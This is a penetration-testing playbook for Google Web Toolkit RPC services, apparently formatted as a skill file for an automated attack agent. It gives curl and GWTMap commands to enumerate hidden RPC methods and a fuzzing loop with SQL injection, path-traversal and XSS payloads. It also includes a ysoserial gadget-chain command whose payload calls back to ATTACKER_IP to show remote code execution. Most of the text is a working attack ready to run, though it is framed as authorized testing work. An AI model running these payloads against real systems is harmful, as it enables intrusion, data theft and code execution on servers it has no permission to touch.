---
name: attack-gwt
description: "Google Web Toolkit (GWT-RPC) exploitation — bootstrap enumeration, RPC method fuzzing, serialized payload injection, Java deserialization via EL injection"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - gwt
  - gwt-rpc
  - java
  - deserialization
  - rpc
  - attack
tech_stack:
  - java
  - gwt
  - tomcat
cwe_ids:
  - CWE-502
  - CWE-20
chains_with:
  - wstg-inpv-11
  - attack-java-rmi
prerequisites: []
severity_boost:
  attack-java-rmi: "GWT-RPC deserialization gadget chain leads to same JVM RCE class as RMI deserialization"
  wstg-inpv-11: "GWT service method fuzzing surfaces server-side code/EL injection points"
---

# Google Web Toolkit (GWT-RPC) Exploitation

## Objective

Enumerate hidden GWT-RPC service methods from the compiled JS bootstrap, fuzz them for injection/deserialization flaws, and abuse the custom GWT-RPC serialization format to reach code execution or business-logic bypass.

## Testing Methodology

### Phase 1: Identify GWT Application

```bash
# GWT apps expose a *.nocache.js bootstrap file and *.cache.js permutations
curl -s "https://TARGET/app/app.nocache.js" | grep -i "gwt"

# Typical GWT-RPC traffic marker (Content-Type + 7-pipe-delimited body)
curl -s -X POST "https://TARGET/app/service" \
  -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
  -H "X-GWT-Permutation: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" \
  -H "X-GWT-Module-Base: https://TARGET/app/" \
  --data-raw "test"
```

### Phase 2: Enumerate RPC Methods (GWTMap)

```bash
# Clone and run GWTMap against the bootstrap, auto-selecting a permutation
git clone https://github.com/FSecureLABS/GWTMap.git
cd GWTMap

# Full enumeration + local backup of the permutation source
python3 gwtmap.py -u "https://TARGET/app/app.nocache.js" --backup

# Enumerate a specific known permutation directly
python3 gwtmap.py -u "https://TARGET/app/C39AB19B83398A76A21E0CD04EC9B14C.cache.js"

# Route enumeration traffic through Burp
python3 gwtmap.py -u "https://TARGET/app/app.nocache.js" --backup -p http://127.0.0.1:8080

# Filter to a single service/method of interest
python3 gwtmap.py -u "https://TARGET/app/app.nocache.js" --filter AuthenticationService.login
```

### Phase 3: Generate & Probe RPC Requests

```bash
# Generate ready-to-send serialized RPC payloads for every method of a service
python3 gwtmap.py -u "https://TARGET/app/app.nocache.js" \
  --filter AuthenticationService --rpc --color

# Auto-send the generated payload and show the response (probe mode)
python3 gwtmap.py -u "https://TARGET/app/app.nocache.js" \
  --filter AuthenticationService.login --rpc --probe

python3 gwtmap.py -u "https://TARGET/app/app.nocache.js" \
  --filter TestService.testDetails --rpc --probe

# Manually crafted GWT-RPC body (7-pipe-delimited stream): version|flags|string-table-count|
# strings...|service-interface|method-name|param-types|param-values|invocation-marker
curl -s -X POST "https://TARGET/app/gwtService" \
  -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
  -H "X-GWT-Permutation: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" \
  --data-raw '7|0|8|https://TARGET/app/|1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D|com.target.client.AuthenticationService|login|java.lang.String/2004016611|admin|1|2|3|4|1|5|6|'
```

### Phase 4: Fuzz Parameters for Injection

```bash
# Once a valid RPC call is known, mutate each string-table entry to test for:
# - SQLi / NoSQLi in service parameters
# - Path traversal in file-handling methods
# - IDOR by changing object IDs / enum ordinals
# - Type confusion (swap java.lang.Integer/3438268394 for java.lang.String/2004016611)

for payload in "' OR '1'='1" "../../../etc/passwd" "999999999" "<script>alert(1)</script>"; do
  curl -s -X POST "https://TARGET/app/gwtService" \
    -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
    --data-raw "7|0|8|https://TARGET/app/|1A2B3C4D...|com.target.client.SearchService|search|java.lang.String/2004016611|${payload}|1|2|3|4|1|5|6|"
done
```

### Phase 5: EL Injection to Deserialization RCE

```text
Legacy GWT (RequestFactory / pre-hardening versions) resolved Expression Language (EL)
in serialized object graphs before a class allow-list was enforced. If GWTMap or manual
fuzzing shows a service echoing/evaluating string-table values, or the server uses
an old gwt-servlet.jar (< 2.7 without RPC.setPermittedRequestFactoryTypes), attempt
a Java deserialization gadget chain against the same endpoint via ysoserial, since
GWT-RPC ultimately deserializes into Java objects server-side.

  java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER_IP:8888/rce' > payload.bin
  # Wrap payload.bin bytes as a GWT-RPC string-table entry / serialized field
  # and submit to the vulnerable service method identified in Phase 3.
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Java deserialization RCE via GWT-RPC (EL injection / gadget chain) | Critical (P1) |
| SQLi/NoSQLi in a GWT-RPC service parameter | Critical (P1) |
| Hidden/undocumented admin service method reachable via GWT-RPC | High (P2) |
| IDOR via object ID/enum ordinal manipulation in RPC payload | High (P2) |
| Path traversal in a GWT-RPC file-handling method | High (P2) |
| Verbose stack trace / class-name disclosure from malformed RPC payload | Low (P4) |

## Evidence Requirements

- Bootstrap URL and resolved permutation (`*.cache.js`) used
- GWTMap enumeration output listing exposed services/methods
- Full request/response pair for the vulnerable RPC call (raw pipe-delimited body)
- For RCE: OOB callback evidence or command output captured on the target
- Screenshot/log of any admin-only method reachable without authorization

## Tools

- `GWTMap` — https://github.com/FSecureLABS/GWTMap — bootstrap parsing, method enumeration, RPC payload generation/probing
- `GWT-Penetration-Testing-Toolset` — https://github.com/GDSSecurity/GWT-Penetration-Testing-Toolset — GWT-specific fuzzing utilities
- `ysoserial` — Java deserialization gadget chain generator
- `Burp Suite` — intercept/replay GWT-RPC traffic (proxy via GWTMap `-p`)

## References

- [From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection - Stevent Seeley](https://web.archive.org/web/20260220100658/https://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html)
- [Hacking a Google Web Toolkit application - thehackerish](https://web.archive.org/web/20210227222455/https://thehackerish.com/hacking-a-google-web-toolkit-application/)
- [FSecureLABS/GWTMap](https://github.com/FSecureLABS/GWTMap)
